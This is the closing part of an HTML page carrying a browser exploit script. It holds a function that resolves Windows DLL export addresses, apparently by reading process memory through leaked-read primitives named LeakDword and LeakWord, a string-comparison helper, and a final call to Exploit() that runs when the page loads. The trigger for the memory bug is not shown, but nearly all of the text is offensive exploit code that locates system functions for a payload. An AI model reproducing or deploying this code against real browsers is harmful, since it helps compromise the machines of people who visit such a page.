function ResolveExport(ModuleBase, target_name_first, target_name_second, target_name_third, target_name_fourth) {
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ExportDataDir = ModuleBase + FileHdr + 0x78; // Import data directory
    var EATRva = LeakDword(ExportDataDir);
    var EATSize = LeakDword(ExportDataDir + 0x4); // Get the size field of the import data dir

    export_num = LeakDword(ModuleBase + EATRva + 0x14);
	addresses = LeakDword(ModuleBase + EATRva + 0x1C);
	names = LeakDword(ModuleBase + EATRva + 0x20);
	ordinals = LeakDword(ModuleBase + EATRva + 0x24);
	
    // Binary search because linear search is too slow
    upper_limit = export_num; // Largest number in search space
    lower_limit = 0; // Smallest number in search space
    num_pointer = Math.floor(export_num/2);
    search_complete = false;

    while(!search_complete) {
        function_str_offset = LeakDword(ModuleBase + names + 4*num_pointer); // Get the offset to the name string
        function_str_lower = LeakDword(ModuleBase + function_str_offset); // Get the first 4 bytes of the string
        res = compare_nums(target_name_first, function_str_lower);
        if(!res && target_name_second) {
            function_str_second = LeakDword(ModuleBase + function_str_offset + 4); // Get the next 4 bytes of the string
            res = compare_nums(target_name_second, function_str_second);
            if(!res && target_name_third) {
                function_str_third = LeakDword(ModuleBase + function_str_offset + 8); // Get the next 4 bytes of the string
                res = compare_nums(target_name_third, function_str_third);
                if(!res && target_name_fourth) {
                    function_str_fourth = LeakDword(ModuleBase + function_str_offset + 12); // Get the next 4 bytes of the string
                    res = compare_nums(target_name_fourth, function_str_fourth);
                }
            }
        }
        if(!res) { // equal
            ordinal = LeakWord(ModuleBase + ordinals + 2*num_pointer);
            function_offset = LeakDword(ModuleBase + addresses + 4*ordinal);
            //alert("[+] Found target export at offset 0x" + function_offset.toString(16));
            return ModuleBase + function_offset;
        } if(res == 1) {
            if(upper_limit == num_pointer) {
                alert("Failed to find export");
            }
            upper_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + lower_limit) / 2);
        } else {
            if(lower_limit == num_pointer) {
                alert("Failed to find export");
            }
            lower_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + upper_limit) / 2);
        }
        if(num_pointer == upper_limit && num_pointer == lower_limit) {
            alert("Failed to find export");
        }
    }
    alert("Failed to find export");
}


// compare_nums: Compares two numbers that represent 4-byte strings for equality. If not, it detects which character is larger or smaller.
function compare_nums(target, current) { // return -1 for target being greater, 0 for equal, 1 for current being greater
    if(target == current) {
        return 0;
    }
    while(target != 0 && current != 0) {
        if((target & 0xff) > (current & 0xff)) {
            return -1;
        } else if((target & 0xff) < (current & 0xff)) {
            return 1;
        }
        target = target >> 8;
        current = current >> 8;
    }
}

Exploit();

</script>
</head>
</html>